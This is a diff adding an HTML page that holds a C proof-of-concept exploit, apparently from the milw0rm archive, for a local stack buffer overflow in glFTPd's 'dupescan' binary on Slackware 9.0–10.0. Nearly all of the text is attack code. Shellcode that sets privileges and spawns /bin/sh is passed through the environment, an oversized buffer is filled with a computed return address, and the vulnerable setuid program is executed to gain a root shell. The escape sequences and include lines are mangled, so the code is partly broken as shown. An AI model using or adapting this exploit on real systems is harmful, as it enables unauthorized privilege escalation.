@@ -1,0 +1,49 @@
+<html>
+<head>
+<title>glFTPd Local Stack Overflow Exploit (PoC) (Slackware 9.0/9.1/10.0) </title>
+<pre>
+/* glFTPd local stack buffer overflow exploit 
+(Proof of Concept) 
+
+Tested in Slackware 9.0 / 9.1 / 10.0 
+
+by CoKi 
+No System Group - http://www.nosystem.com.ar 
+*/ 
+
+#include &lt;'stdio.h&gt; 
+#include &lt;'strings.h&gt; 
+#include &lt;'unistd.h&gt; 
+
+#define BUFFER 288 + 1 
+#define PATH &quot;/glftpd/bin/dupescan&quot; 
+
+char shellcode[]= 
+&quot;xb0x31xcdx80x89xc3x31xc0xb0x17xcdx80&quot; 
+&quot;x31xdbx31xc0xb0x17xcdx80&quot; 
+&quot;xebx1fx5ex89x76x08x31xc0x89x46x0cx88x46x07&quot; 
+&quot;xb0x0bx89xf3x8dx4ex08x8dx56x0cxcdx80x31xdb&quot; 
+&quot;x89xd8x40xcdx80xe8xdcxffxffxff/bin/sh&quot;; 
+
+int main(void) { 
+
+char *env[3] = {shellcode, NULL}; 
+char buf[BUFFER], *path; 
+int *buffer = (int *) (buf); 
+int i; 
+int ret = 0xbffffffa - strlen(shellcode) - strlen(PATH); 
+
+for(i=0; i&lt;=BUFFER; i+=4) 
+*buffer++ = ret; 
+
+printf(&quot; glFTPd local stack buffer overflow (Proof of Concept) &quot;); 
+printf(&quot; by CoKi &quot;); 
+
+execle(PATH, &quot;dupescan&quot;, buf, NULL, env); 
+} 
+
+
+// milw0rm.com [2004-09-23]
+</pre>
+</html>
+
